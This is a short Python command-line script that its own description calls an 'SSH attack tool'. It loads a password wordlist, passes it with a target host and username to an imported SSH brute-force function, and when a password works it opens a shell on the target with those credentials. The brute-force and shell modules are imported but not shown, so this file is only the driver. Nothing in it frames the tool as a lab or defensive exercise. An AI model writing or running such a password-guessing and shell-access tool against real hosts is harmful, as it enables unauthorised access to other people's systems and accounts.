import argparse
from bruteforce import ssh_bruteforce
from executor import shell
from utils import load_wordlist

def main():
    parser = argparse.ArgumentParser(description="SSH attack tool")
    parser.add_argument("host")
    parser.add_argument("username")
    parser.add_argument("--wordlist")
    parser.add_argument("--shell", action="store_true")

    args = parser.parse_args()

    if args.wordlist:
        passwords = load_wordlist(args.wordlist)
        creds = ssh_bruteforce(args.host, args.username, passwords)

        if creds and args.shell:
            user, pw = creds
            shell(args.host, user, pw)

if __name__ == "__main__":
    main()